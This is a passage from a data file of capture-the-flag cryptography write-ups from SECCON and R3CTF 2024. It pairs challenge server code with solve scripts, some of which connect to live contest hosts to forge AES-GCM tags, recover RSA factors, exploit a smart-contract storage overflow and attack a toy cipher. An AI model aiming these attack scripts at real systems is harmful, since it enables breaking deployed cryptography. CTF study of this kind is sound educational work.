p\ndelta = t21 - t11\n# (h1^2 - h2^2) delta_p = -delta\ndelta_p = -delta / (h1 ** 2 - h2 ** 2)\ntarget_pt = _from_gf2e(delta_p).to_bytes(16, 'big')\n\nio.sendlineafter(b\"[1] summon, [2] dual summon >\", b'2')\nio.sendlineafter('>', target_pt.hex().encode())\nio.interactive()", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\dual_summon\\server.py", "category": "crypto", "solution_code": "from Crypto.Cipher import AES\nimport secrets\nimport os\nimport signal\n\nsignal.alarm(300)\n\nflag = os.getenv('flag', \"SECCON{sample}\")\n\nkeys = [secrets.token_bytes(16) for _ in range(2)]\nnonce = secrets.token_bytes(16)\n\ndef summon(number, plaintext):\n    assert len(plaintext) == 16\n    aes = AES.new(key=keys[number-1], mode=AES.MODE_GCM, nonce=nonce)\n    ct, tag = aes.encrypt_and_digest(plaintext)\n    return ct, tag\n\n# When you can exec dual_summon, you will win\ndef dual_summon(plaintext):\n    assert len(plaintext) == 16\n    aes1 = AES.new(key=keys[0], mode=AES.MODE_GCM, nonce=nonce)\n    aes2 = AES.new(key=keys[1], mode=AES.MODE_GCM, nonce=nonce)\n    ct1, tag1 = aes1.encrypt_and_digest(plaintext)\n    ct2, tag2 = aes2.encrypt_and_digest(plaintext)\n    # When using dual_summon you have to match tags\n    assert tag1 == tag2\n\nprint(\"Welcome to summoning circle. Can you dual summon?\")\nfor _ in range(10):\n    mode = int(input(\"[1] summon, [2] dual summon >\"))\n    if mode == 1:\n        number = int(input(\"summon number (1 or 2) >\"))\n        name   = bytes.fromhex(input(\"name of sacrifice (hex) >\"))\n        ct, tag = summon(number, name)\n        print(f\"monster name = [---filtered---]\")\n        print(f\"tag(hex) = {tag.hex()}\")\n\n    if mode == 2:\n        name   = bytes.fromhex(input(\"name of sacrifice (hex) >\"))\n        dual_summon(name)\n        print(\"Wow! you could exec dual_summon! you are master of summoner!\")\n        print(flag)\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\Tidal_wave\\output.py", "category": "crypto", "solution_code": "N=164154991219443437626081332614158730243917037448199716655783585386114084944921014678446140961950779185987551082302233189672777124070342896078792406421295367843743938975018623106720031195121691323765575499580580898542615857150538031740984848418002758286176739690774217960569804300041578781846805528383738052213\ndets=[121915670423707921083577303353189290105753205383086881070909346847225721867189982304974229518005262154762849226647440342352684619218902684092877409646116087748803226587133413523670397361656258896033054738138430731654935305944293063008598790319170718134139499489852902861615117239766986756325340620341359067059, 63343907682857872607878509945567224921486563246612523881799516305479378868588450586885797937963326267999856247491496316934335364287874172156617589213358253481042121811294542969712559236194280744424138336229118925434936952405022974349635501863559419746472305473002537267130657528843088873920749884958517776126, 59960940183998431136384918539675756934170966091163467968520767153325645962136560671200068950396298697758136800457041389740969533526365341358324980190789364851288082349097074921667208036518844755233710743624208158407186069232568793687577332891891135060205909769204793547540419736438724970172276973830128775865, 108829408922942286612721982361373572260936023961587946486169403040578253579440829820239010566478578127114799035116326113203711182797112095383021696613374475555658419352073960982578022913638292695421891513852370755068743452809789583651874851084460405580493329353438531990864035467217374707867753237831662340107, 136082277584358575685361011661023085616417237875634179263934704936748315191376928549108194130709358128225664890650216073807367168153144412681870265723476036946837931149035233619755229818204514469041841986545121479167294681734086084733870313961011752655615997585957760731230746666214789210698880358229532415019]\ndouble_alphas=[35976734624879755076455546910624448429959110096420446915522201441214317873079403405124151580270840526492943605740690902430682201738350736215988513774269809076824070253694907241328151914110223882223519124576652872065762376686706012584107268294871909276147135161647110820491522435257355439956983009752615225316, 41929841433364620768930436553939939226147302719747291382882277807486429362374305549200095497594235040370231384277903931053038815220394948440924879470334163225467720360310759024975422849054739415395725991044381502099896399361289805538946601577381059204483874844362784316221294954614171482991957931485813308579, 100547449434142104055114023443315037664493224370916362056937424202176345896609659825070877543812641245277367713064783150812199320588918807953955650569145460369545472494020828621888898364519792631370926183688770458407520869099059437179429342181626401659569553655598330646055509026472527160820737739110878236137, 91518817961778584320929039126279744748940103953769587691825178329705657874684773624316790802396345930926479866453006699915520928582307623610252570796031434001820668350009680289941239045917208419522621120759719064705431452247827183573288040180337187496252847995095834948736164779407456177559436559467020385334, 62316109029508031780652419616264560468599678224746561277597239495871703546118491999216069473026547355949546656145458252722781555646204543526902508048762056616064290195832178667018452846264137349612069453286030414881738989809681189625553529633417168200156045463758802482841856869690681512850398316875039523409, 115868161342525675340016896937309904700095308311039634169749090137087394203148654309806058770246045028348096758474128772639352140327181844581828606266074694049857703794539626378219869823497392326000342290381935026784451322642140001480009767807203228335741924648224785785918503256265049290112556572045761666371, 16086560834405282091375940290951278036247174390915083585386080415103993736350578660099670226864434013444530004015833441516838220163021736309205431717757797919540626073067610694184658630046575345609942776979756194618648293182279331715976763919729226448301521700232385776249532055572056475474870551498347728030, 141575005459307021588084407648402988153702745909796771599597295462927640822173091027699074030629995050118609967694014779262804362593505355390827708882415903781314526593437437022053831158358170777498834049655665462591683454287689365558154486615702566762032949150004109884744132239220334740608769900222567615449, 96881895711292971115231774400582898229460336408567734776758234067609470090604415694667705528660502303056465416290085600662914502502270016645468272256428746603430865104055118751958729087395260239043367759492536124852275293614909619610316513008719031942074448810716094916944698789037732837090885679415532074448, 106790085136134347213961955180572211708729366477696958769234639423855807702823293431846124690314000285731409612719017795170484697598119442174006078713564206866451553921734418845045908826920428242369075983859165228121379600218918637536239397782945473882322256902502267962262388949128175067146018338181596375178, 6423726290", "name": "output"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\Tidal_wave\\solve_step1.py", "category": "crypto", "solution_code": "\nfrom sage.all import Zmod, matrix, PolynomialRing, Sequence, Ideal, save, load, prod\nfrom output import dets, double_alphas, alpha_sum_rsa, p_encoded, key_encoded, N, encrypted_flag\n\nk, n = 8, 36\nZn = Zmod(N)\nZx = PolynomialRing(Zn, [f\"alpha_{i}\" for i in range(1, n + 1)])\nalphas = Zx.gens()\nmod_polys = [alphas[i]**2 - double_alphas[i] for i in range(n)]\nG = matrix(Zx, k, n, lambda i, j: (alphas[j]**(i%2) * pow(double_alphas[j], (i//2), N)) % N)\n\ndet_polys = []\nfor i in range(5):\n    start_col = i * k - i\n    submatrix = G.submatrix(0, start_col, 8, 8)\n    det_polys.append(submatrix.det() - dets[i])\n\n# try to use groebner basis to solve the equations\nseq = Sequence(det_polys + mod_polys)\n# seq += [sum(alphas)**65537 -  alpha_sum_rsa]\nI = Ideal(seq)\ngroebner_basis = I.groebner_basis()\npoly_rsa = sum(alphas)\neqs = []\nfor i, poly in enumerate(groebner_basis):\n    print(f\"{i = }, {poly = }\")\n    poly_rsa %= poly\n    if i != 0:\n        eqs.append(poly)\n# solve the equations\nprint(f\"{poly_rsa = }\")\nres = poly_rsa\nfor i in range(16):\n    poly_rsa = poly_rsa ** 2\n    poly_rsa %= mod_polys[-1]\n    \npoly_rsa = res * poly_rsa - alpha_sum_rsa\npoly_rsa %= mod_polys[-1]\n\neqs.append(poly_rsa)\nprint(f\"{poly_rsa = }\")\n\nseq = Sequence(eqs)\nmat, monos = seq.coefficients_monomials()\n\nb = -mat[:, -1]\nmat = mat[:, :-1]\nsol = mat.solve_right(b).list()\nprint(f\"{sol = }\")\nfor i, si in enumerate(sol):\n    assert si**2 % N == double_alphas[i]\n    \nprint(f\"OK\")", "name": "solve_step1"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\Tidal_wave\\solve_step2.py", "category": "crypto", "solution_code": "\nfrom sage.all import Zmod, matrix, block_matrix, identity_matrix, PolynomialRing, Sequence, ZZ, save, load, prod, vector\nfrom output import dets, double_alphas, alpha_sum_rsa, p_encoded, key_encoded, N, encrypted_flag, alphas\n\n\nk, n = 8, 36\nZn = Zmod(N)\nG = matrix(ZZ, k, n, lambda i, j: pow(alphas[j], i, N))\n\n# p_encoded = pvec*G + make_random_vector(R, n)\nG = G.stack(vector(p_encoded))\nIn = identity_matrix(ZZ, n) * N\nIk = identity_matrix(ZZ, k + 1) * 2**(1000 - 64)\nIk[-1,-1] = 2**1000\nM = block_matrix([\n   [G, Ik],\n   [In, 0]\n])\n\nL = M.LLL()\nfor row in L:\n    row_bits = [int(x).bit_length() for x in row]\n    if all(900 <= x <= 1000 for x in row_bits[:-(k+1)]):\n        print(row[-(k+1):-1])\n        p_vec = [abs(ZZ(num/2**(1000 - 64))) for num in row[-(k+1):-1]]\n        print(f\"{p_vec = }\")\n        ph = sum(p_vec[i] * pow(2, 64*i) for i in range(k))\n        pr = PolynomialRing(Zmod(N), 'x')\n        x = pr.gen()\n        fx = ph + x \n        pl = fx.small_roots(X=2**64, beta=0.495)\n        p = ZZ(pl[0]) + ph\n        assert N % p == 0\n        q = N // p\n        print(f\"{p = }\")\n        print(f\"{q = }\")\n        break", "name": "solve_step2"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\Tidal_wave\\solve_step3.py", "category": "crypto", "solution_code": "from sage.all import Zmod, matrix, block_matrix, identity_matrix, PolynomialRing, Sequence, ZZ, save, load, prod, vector, codes, GF, crt\nfrom output import dets, double_alphas, alpha_sum_rsa, p_encoded, key_encoded, N, encrypted_flag, alphas\n\nk, n = 8, 36\nZn = Zmod(N)\nG = matrix(ZZ, k, n, lambda i, j: pow(alphas[j], i, N))\n\np = 12565690801374373168209122780100947393207836436607880099543667078825364019537227017599533210660179091620475025517583119411701260337964778535342984769252959\nq = 13063745862781294589547896930952928867567164583215526040684813499782622799740291421111907000771263532192148557705806567586876208831387558514840698244078507\n\nFq = GF(q)\nFp = GF(p)\nbetas = [1 for i in range(n)]\nalphas_p = [Fp(alpha) for alpha in alphas]\nalphas_q = [Fq(alpha) for alpha in alphas]\nCp = codes.GeneralizedReedSolomonCode(alphas_p, k, betas)\nprint(Cp.decoders_available())\ndp = Cp.minimum_distance() // 2\n# r = c + e\nrp = vector(Fp, key_encoded)\nprint(f\"{dp = }\")\n# d = (n- k + 1) //2\nmp = Cp.decode_to_message(rp, decoder_name='Gao')\nprint(mp)\n\nCq = codes.GeneralizedReedSolomonCode(alphas_q, k, betas)\nprint(Cq.decoders_available())\ndq = Cq.minimum_distance() // 2\n# r = c + e\nrq = vector(Fq, key_encoded)\nprint(f\"{dq = }\")\n# d = (n- k + 1) //2\nmq = Cq.decode_to_message(rq, decoder_name='Gao')\nprint(mq)\n\nkey_list = [crt([ZZ(mp[i]), ZZ(mq[i])], [p, q]) for i in range(k)]\nkeyvec = vector(ZZ, key_list)\n\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nkey = hashlib.sha256(str(keyvec).encode()).digest()\ncipher = AES.new(key, AES.MODE_ECB)\nflag = cipher.decrypt(encrypted_flag)\nprint(f\"{flag=}\")", "name": "solve_step3"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\Trillion_Ether\\solve.py", "category": "crypto", "solution_code": "# slot info: \n# user address: adr\n# WalletID            SlodID                    Content\n# adr - 2     keccak(0) + 3*(adr - 2) + 0       adr - 1 \n# adr - 2     keccak(0) + 3*(adr - 2) + 1       0\n# adr - 2     keccak(0) + 3*(adr - 2) + 2       adr\n# adr - 1     keccak(0) + 3*(adr - 1) + 0       adr\n# adr - 1     keccak(0) + 3*(adr - 1) + 1       0\n# adr - 1     keccak(0) + 3*(adr - 1) + 2       adr\n\n# 3 * walletid  % 2^256 = 3*(adr - 2) + 2\n# 2**256 % 3 = 1\n# let WalletID = adr - 1  + 2*(2**256 // 3) \n#              = adr - 1 +  2*(2**256 -1) / 3\n# then the slodID = 3 * (adr - 1  + 2*(2**256 -1) / 3)\n#                 = keccak(0) + 3 * adr - 3 + 2**256 - 2 % 2**256\n#                 = keccak(0) + 3 * adr - 5\n#                 = keccak(0) + 3 * (adr - 2) + 1\n# For WalletID = adr - 1  + 2*(2**256 // 3): \n# Name:     keccak(0) + 3*(adr - 2) + 1       0\n# Balance:  keccak(0) + 3*(adr - 2) + 2       adr\n# Address:  keccak(0) + 3*(adr - 1) + 0       adr\n# We now have a wallet with balance amount being our address!\n", "name": "solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\TinySEAL\\compute_trace.py", "category": "crypto", "solution_code": "import itertools\n    \ngens = [3, 5, 7, 11, 13, 17]\nexp_bound = 6\n\ntarget_sub_group = sorted(range(1, 4096 * 2, 2))\nsums = {}\nsums[1] = 0\nsub_group = {}\nsub_group[1] = [0] * len(gens)\nexps = itertools.product(range(exp_bound), repeat=len(gens))\n\nfor exp in exps:\n    s = 1\n    for g, e in zip(gens, exp):\n        s = s * g ** e % (4096 * 2)\n    if s not in sub_group:\n        sub_group[s] = exp\n        sums[s] = sum(exp)\n    elif sum(exp) < sums[s]:\n        sub_group[s] = exp\n        sums[s] = sum(exp)\n                        \n# print(f\"{len(sub_group) = }\")\nsub_group_keys = sorted(sub_group.keys())\nassert (sub_group_keys == target_sub_group)", "name": "compute_trace"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\TinySEAL\\exp.py", "category": "crypto", "solution_code": "import tenseal.sealapi as sealapi\nimport base64\nimport os\nfrom tqdm import tqdm\nfrom compute_trace import gens, sub_group\nfrom pwn import remote, log\n\npoly_modulus_degree = 4096\nplain_modulus = 163841\n\nflag = os.getenv('FLAG')\n\n\ndef gen_keys():\n    parms = sealapi.EncryptionParameters(sealapi.SCHEME_TYPE.BFV)\n    parms.set_poly_modulus_degree(poly_modulus_degree)\n    parms.set_plain_modulus(plain_modulus)\n    coeff = sealapi.CoeffModulus.BFVDefault(\n        poly_modulus_degree, sealapi.SEC_LEVEL_TYPE.TC128)\n    parms.set_coeff_modulus(coeff)\n\n    ctx = sealapi.SEALContext(parms, True, sealapi.SEC_LEVEL_TYPE.TC128)\n\n    keygen = sealapi.KeyGenerator(ctx)\n    public_key = sealapi.PublicKey()\n    keygen.create_public_key(public_key)\n    secret_key = keygen.secret_key()\n\n    parms.save(\"./app/parms\")\n    public_key.save(\"./app/public_key\")\n    secret_key.save(\"./app/secret_key\")\n\n\ndef load():\n    parms = sealapi.EncryptionParameters(sealapi.SCHEME_TYPE.BFV)\n    parms.load(\"./parms\")\n\n    ctx = sealapi.SEALContext(parms, True, sealapi.SEC_LEVEL_TYPE.TC128)\n\n    public_key = sealapi.PublicKey()\n    public_key.load(ctx, \"./public_key\")\n    \n    return ctx, public_key\n\n\ndef gen_galois_keys(ctx, secret_key, elt):\n    keygen = sealapi.KeyGenerator(ctx, secret_key)\n    galois_keys = sealapi.GaloisKeys()\n    keygen.create_galois_keys(elt, galois_keys)\n    galois_keys.save(\"./galois_key\")\n    return galois_keys\n\n\ndef gen_polynomial(a):\n    poly = hex(a[0])[2:]\n    for i in range(1, len(a)):\n        poly = hex(a[i])[2:] + 'x^' + str(i) + ' + ' + poly\n    return poly\n\n\ndef check_result(ctx, decryptor, target):\n    plaintext = sealapi.Plaintext()\n    ciphertext = sealapi.Ciphertext(ctx)\n    ciphertext.load(ctx, \"./computation\")\n    decryptor.decrypt(ciphertext, plaintext)\n    assert plaintext.to_string() == target.to_string()\n\n\ndef send(filepath):\n    f = open(filepath, \"rb\")\n    data = base64.b64encode(f.read()).decode()\n    f.close()\n    print(data)\n\n\ndef recv(filepath):\n    try:\n        data = base64.b64decode(input())\n    except:\n        print(\"Invalid Base64!\")\n        exit(0)\n\n    f = open(filepath, \"wb\")\n    f.write(data)\n    f.close()\n\ndef list_methods(obj):\n    all_attributes = dir(obj)\n    methods = [attribute for attribute in all_attributes if callable(getattr(obj, attribute))]\n    return methods\n\n\nctx, public_key = load()\nencryptor = sealapi.Encryptor(ctx, public_key)\nelt = gens\n\nio = remote('ctf2024-entry.r3kapig.com', 30800)\n\nio.recvuntil(b'Here Is Ciphertext:\\n')\nraw_line = io.recvline().strip()\ndata = base64.b64decode(raw_line)\nf = open(\"./ciphertext\", \"wb\")\nf.write(data)\nf.close()\n\nciphertext = sealapi.Ciphertext(ctx)\nciphertext.load(ctx, \"./ciphertext\")\n\n\nio.recvuntil(b\"Please give me your choice:\")\ninp = b\" \".join([str(elt[j]).encode() for j in range(6)])\nio.sendline(inp)\nlog.info(io.recvline().decode())\n\ndata = base64.b64decode(io.recvline().strip())\nf = open(\"./galois_key\", \"wb\")\nf.write(data)\nf.close()\n\ngalois_keys = sealapi.GaloisKeys()\ngalois_keys.load(ctx, \"./galois_key\")\n\nevaluator = sealapi.Evaluator(ctx)\ntarget_ciphertext = ciphertext\n\nfor i in tqdm(range(3, 4096 * 2 , 2)):\n    ciphertext = sealapi.Ciphertext(ctx)\n    ciphertext.load(ctx, \"./ciphertext\")\n    res = 1\n    exps = sub_group[i]\n    # print(f\"Computing {i}: {exps}\")\n    for j in range(len(exps)):\n        res *= elt[j] ** exps[j] \n        res %= (4096 * 2)\n        for _ in range(exps[j]):\n            evaluator.apply_galois_inplace(ciphertext, elt[j], galois_keys)\n    assert res == i, f\"Failed at {i}: {res = }\"\n    # add ciphertext\n    evaluator.add_inplace(target_ciphertext, ciphertext)\n\n# mul target_ciphertext with constant value `mul`\nmul = pow(4096, -1, plain_modulus)\nplaintext_mul = sealapi.Plaintext(hex(mul)[2:])\nevaluator.multiply_plain_inplace(target_ciphertext, plaintext_mul)\ntarget_ciphertext.save(\"./computation\")\nf = open(\"./computation\", \"rb\")\ndata = base64.b64encode(f.read()).decode()\nf.close()\nio.sendlineafter(b\"Give Me Your Computation\\n\", data.encode())\nprint(io.recvline().decode())", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\TinySEAL\\main.py", "category": "crypto", "solution_code": "import tenseal.sealapi as sealapi\nfrom random import randint\nfrom signal import alarm\nimport time\nimport base64\nimport os\n\npoly_modulus_degree = 4096\nplain_modulus = 163841\n\nflag = os.getenv('FLAG')\n\n\ndef gen_keys():\n    parms = sealapi.EncryptionParameters(sealapi.SCHEME_TYPE.BFV)\n    parms.set_poly_modulus_degree(poly_modulus_degree)\n    parms.set_plain_modulus(plain_modulus)\n    coeff = sealapi.CoeffModulus.BFVDefault(\n        poly_modulus_degree, sealapi.SEC_LEVEL_TYPE.TC128)\n    parms.set_coeff_modulus(coeff)\n\n    ctx = sealapi.SEALContext(parms, True, sealapi.SEC_LEVEL_TYPE.TC128)\n\n    keygen = sealapi.KeyGenerator(ctx)\n    public_key = sealapi.PublicKey()\n    keygen.create_public_key(public_key)\n    secret_key = keygen.secret_key()\n\n    parms.save(\"/app/parms\")\n    public_key.save(\"/app/public_key\")\n    secret_key.save(\"/app/secret_key\")\n\n\ndef load():\n    parms = sealapi.EncryptionParameters(sealapi.SCHEME_TYPE.BFV)\n    parms.load(\"/app/parms\")\n\n    ctx = sealapi.SEALContext(parms, True, sealapi.SEC_LEVEL_TYPE.TC128)\n\n    public_key = sealapi.PublicKey()\n    public_key.load(ctx, \"/app/public_key\")\n\n    secret_key = sealapi.SecretKey()\n    secret_key.load(ctx, \"/app/secret_key\")\n    return ctx, public_key, secret_key\n\n\ndef gen_galois_keys(ctx, secret_key, elt):\n    keygen = sealapi.KeyGenerator(ctx, secret_key)\n    galois_keys = sealapi.GaloisKeys()\n    keygen.create_galois_keys(elt, galois_keys)\n    galois_keys.save(\"/app/galois_key\")\n    return galois_keys\n\n\ndef gen_polynomial(a):\n    poly = hex(a[0])[2:]\n    for i in range(1, len(a)):\n        poly = hex(a[i])[2:] + 'x^' + str(i) + ' + ' + poly\n    return poly\n\n\ndef check_result(ctx, decryptor, target):\n    plaintext = sealapi.Plaintext()\n    ciphertext = sealapi.Ciphertext(ctx)\n    ciphertext.load(ctx, \"/app/computation\")\n    decryptor.decrypt(ciphertext, plaintext)\n    assert plaintext.to_string() == target.to_string()\n\n\ndef send(filepath):\n    f = open(filepath, \"rb\")\n    data = base64.b64encode(f.read()).decode()\n    f.close()\n    print(data)\n\n\ndef recv(filepath):\n    try:\n        data = base64.b64decode(input())\n    except:\n        print(\"Invalid Base64!\")\n        exit(0)\n\n    f = open(filepath, \"wb\")\n    f.write(data)\n    f.close()\n\n\ndef main():\n    alarm(3)\n    welcome = \"Welcome to R3CTF 2024! Hope you can enjoy this challenge!\"\n    begin = \"In 1997, I learned to drive a car...\"\n    description = \"Today, DengFeng wants to do some calculations... Can you help him?\"\n\n    print(welcome)\n    print(begin)\n    print(description)\n\n    ctx, public_key, secret_key = load()\n    encryptor = sealapi.Encryptor(ctx, public_key)\n    decryptor = sealapi.Decryptor(ctx, secret_key)\n\n    a = [randint(1, plain_modulus - 1) for _ in range(poly_modulus_degree)]\n    poly = gen_polynomial(a)\n    target = sealapi.Plaintext(gen_polynomial(\n        a[:1] + [0 for _ in range(poly_modulus_degree-1)]))\n\n    plaintext = sealapi.Plaintext(poly)\n    ciphertext = sealapi.Ciphertext()\n    encryptor.encrypt(plaintext, ciphertext)\n    ciphertext.save(\"/app/ciphertext\")\n\n    print(\"Here Is Ciphertext:\")\n    send(\"/app/ciphertext\")\n\n    try:\n        elt = [int(_) for _ in input(\"Please give me your choice:\").split()]\n    except:\n        print(\"Invalid array!\")\n        exit(0)\n\n    if len(elt) > 12 or len(elt) == 0:\n        print(\"No more!\")\n        exit(0)\n\n    try:\n        galois_key = gen_galois_keys(ctx, secret_key, elt)\n    except:\n        print(\"Invalid galois!\")\n        exit(0)\n\n    print(\"Here is your galois key:\")\n    send(\"/app/galois_key\")\n\n    print(\"Give Me Your Computation\")\n    recv(\"/app/computation\")\n\n    try:\n        check_result(ctx, decryptor, target)\n    except:\n        print(\"Incorret Answer!\")\n        exit(0)\n\n    print(flag)\n\n\n# gen_keys()\nmain()\n", "name": "main"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\Sparrow\\challenge\\main.py", "category": "crypto", "solution_code": "# Problem by rec, have fun.\nimport os\nimport signal\nfrom utils import Sparrow, fault, noise\n\n\nflag = os.getenv('FLAG')\npatience = 1337 + 1337\nsec = os.urandom(16)\nspr = Sparrow(key=os.urandom(16))\n\n\ndef proof_of_work():\n    import random, string, hashlib\n\n    ss = ''.join(random.choices(string.ascii_letters + string.digits, k=20))\n    sh = hashlib.sha256(ss.encode()).hexdigest()\n    print(f\"|    sha256(XXXX + {ss[4:]}) == {sh}\")\n    prefix = input(\"|    XXXX>\")\n    return prefix == ss[:4]\n\n\ndef oracle(t: int) -> dict:\n    s, es, cs = os.urandom(16), str(), str()\n    spr.st(s)\n    for _ in range(t):\n        e = os.urandom(16)\n        c = noise(spr, fault(spr, e).encrypt(sec))\n        es += e.hex()\n        cs += c.hex()\n    spr.ed()\n    return {\"s\": s.hex(), \"e\": es, \"c\": cs}\n\n\nif __name__ == \"__main__\":\n    try:\n        # assert proof_of_work()\n        # signal.alarm(777)\n\n        print('|  Good luck ')\n        while patience > 0:\n            print('|  Menu:\\n|    [H]it\\n|    [S]tand\\n|    [Q]uit')\n            inp = input('|  >').lower()\n            if inp == 'h':\n                chaos = max(int(input('|  chaos>')), 1)\n                if (patience := patience - chaos) >= 0:\n                    print(oracle(chaos))\n            elif inp == 's':\n                if all([\n                    bytes.fromhex(input('|  key>')) == spr.key, \n                    bytes.fromhex(input('|  sec>')) == sec\n                ]):\n                    print('|  Okay ')\n                    print('|  ðŸ', flag)\n                    break\n            else:\n                raise Exception\n            patience >>= 1\n        else:\n            print('|  Nah ')\n    except Exception as e:\n        print(e)\n        print('|  Bye ')\n        exit()", "name": "main"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\Sparrow\\challenge\\utils.py", "category": "crypto", "solution_code": "import random\nfrom Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l\n\n\nclass Sparrow:\n    ROUNDS = 7\n    BLOCK_SIZE = 16\n    SBOX = [0x76,0x11,0xb8,0xdf,0xdd,0xba,0x13,0x74,0x17,0x70,0xd9,0xbe,0xbc,0xdb,0x72,0x15,0xb4,0xd3,0x7a,0x1d,0x1f,0x78,0xd1,0xb6,0xd5,0xb2,0x1b,0x7c,0x7e,0x19,0xb0,0xd7,0xc5,0xa2,0x0b,0x6c,0x6e,0x09,0xa0,0xc7,0xa4,0xc3,0x6a,0x0d,0x0f,0x68,0xc1,0xa6,0x07,0x60,0xc9,0xae,0xac,0xcb,0x62,0x05,0x66,0x01,0xa8,0xcf,0xcd,0xaa,0x03,0x64,0x27,0x40,0xe9,0x8e,0x8c,0xeb,0x42,0x25,0x46,0x21,0x88,0xef,0xed,0x8a,0x23,0x44,0xe5,0x82,0x2b,0x4c,0x4e,0x29,0x80,0xe7,0x84,0xe3,0x4a,0x2d,0x2f,0x48,0xe1,0x86,0x94,0xf3,0x5a,0x3d,0x3f,0x58,0xf1,0x96,0xf5,0x92,0x3b,0x5c,0x5e,0x39,0x90,0xf7,0x56,0x31,0x98,0xff,0xfd,0x9a,0x33,0x54,0x37,0x50,0xf9,0x9e,0x9c,0xfb,0x52,0x35,0xd4,0xb3,0x1a,0x7d,0x7f,0x18,0xb1,0xd6,0xb5,0xd2,0x7b,0x1c,0x1e,0x79,0xd0,0xb7,0x16,0x71,0xd8,0xbf,0xbd,0xda,0x73,0x14,0x77,0x10,0xb9,0xde,0xdc,0xbb,0x12,0x75,0x67,0x00,0xa9,0xce,0xcc,0xab,0x02,0x65,0x06,0x61,0xc8,0xaf,0xad,0xca,0x63,0x04,0xa5,0xc2,0x6b,0x0c,0x0e,0x69,0xc0,0xa7,0xc4,0xa3,0x0a,0x6d,0x6f,0x08,0xa1,0xc6,0x85,0xe2,0x4b,0x2c,0x2e,0x49,0xe0,0x87,0xe4,0x83,0x2a,0x4d,0x4f,0x28,0x81,0xe6,0x47,0x20,0x89,0xee,0xec,0x8b,0x22,0x45,0x26,0x41,0xe8,0x8f,0x8d,0xea,0x43,0x24,0x36,0x51,0xf8,0x9f,0x9d,0xfa,0x53,0x34,0x57,0x30,0x99,0xfe,0xfc,0x9b,0x32,0x55,0xf4,0x93,0x3a,0x5d,0x5f,0x38,0x91,0xf6,0x95,0xf2,0x5b,0x3c,0x3e,0x59,0xf0,0x97]\n\n    def __init__(self, key: bytes, seed: bytes=None) -> None:\n        self.key = key\n        self.seed, self.rng = None, None\n        if seed: self.st(seed)\n    \n    def st(self, seed: bytes):\n        self.seed, self.rng = seed, random.Random()\n        self.rng.seed(seed)\n    \n    def ed(self):\n        self.seed, self.rng = None, None\n\n    def pad(self, msg: bytes) -> bytes:\n        if len(msg) % self.BLOCK_SIZE:\n            msg += b'\\x00' * (self.BLOCK_SIZE - len(msg) % self.BLOCK_SIZE)\n        return msg\n\n    def xor(self, a: bytes, b: bytes) -> bytes:\n        return bytes([a[i] ^ b[i] for i in range(self.BLOCK_SIZE)])\n\n    def split(self, b: bytes) -> list[int]:\n        return list(map(int, bin(b2l(b))[2:].zfill(self.BLOCK_SIZE*8)))\n\n    def unite(self, l: list[int]) -> bytes:\n        return l2b(int(''.join(map(str, l)), 2), self.BLOCK_SIZE)\n    \n    def sub(self, b: bytes) -> bytes:\n        return bytes([self.SBOX[b[i]] for i in range(self.BLOCK_SIZE)])\n    \n    def encrypt_block(self, block: bytes) -> bytes:\n        for _ in range(self.ROUNDS - 1):\n            block = self.sub(block)\n            block = self.split(block); self.rng.shuffle(block); block = self.unite(block)\n            block = self.xor(block, self.key)\n        block = self.split(block); self.rng.shuffle(block); block = self.unite(block)\n        return block\n    \n    def encrypt(self, msg: bytes) -> bytes:\n        assert self.rng\n        pt = self.pad(msg)\n        ct = b''\n        for i in range(0, len(pt), self.BLOCK_SIZE):\n            block = pt[i: i + self.BLOCK_SIZE]\n            ct += self.encrypt_block(block)\n        return ct\n\ndef fault(spr: Sparrow, e: bytes):\n    from copy import deepcopy\n    \n    rps = deepcopy(spr)\n    rps.key = rps.xor(rps.key, e)\n    return rps\n\ndef noise(spr: Sparrow, c: bytes):\n    c = spr.split(c); random.shuffle(c); c = spr.unite(c)\n    return c", "name": "utils"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\Sparrow\\solve\\exp.py", "category": "crypto", "solution_code": "from linearizaion import ABC_linearization\nfrom sage.all import PolynomialRing, GF, matrix, vector, QQ, BooleanPolynomialRing, ZZ, Sequence, solve\nfrom utils import Sparrow, fault, noise\nimport os\nfrom pwn import remote, log, context\nimport json\nfrom pwnlib.util.iters import mbruteforce\nimport string\nimport hashlib\n\nspr = Sparrow(key=os.urandom(16))\n# ctf2024-entry.r3kapig.com:32063\nio = remote(\"ctf2024-entry.r3kapig.com\", 32063)\n# context.log_level = 'debug'\n\ndef solve_pow(io:remote):\n    io.recvuntil(b\"|    sha256(XXXX + \")\n    suffix = io.recvuntil(b\") == \").strip(b\") == \")\n    target = io.recvline().strip().decode()\n    log.info(f\"{suffix = }\")\n    log.info(f\"{target = }\")\n    table = string.ascii_letters + string.digits\n    sol = mbruteforce(lambda x: hashlib.sha256(x.encode() + suffix).hexdigest() == target, table, 4)\n    io.sendlineafter(b\"|    XXXX>\", sol.encode())\n\ndef oracle(t: int) -> dict:\n    io.sendlineafter(b'|  >', b'h')\n    io.sendlineafter(b'|  chaos>', str(t).encode())\n    data = io.recvline().strip().decode().replace(\"'\", '\"')\n    return json.loads(data)\n    \ndef recover_ct(t = 132):\n    ys = PolynomialRing(ZZ, 128, 'y').gens()\n    data = oracle(t)\n    seed = bytes.fromhex(data['s'])\n    cts = [bytes.fromhex(data['c'][i:i+32]) for i in range(0, len(data['c']), 32)]\n    es = [bytes.fromhex(data['e'][i:i+32]) for i in 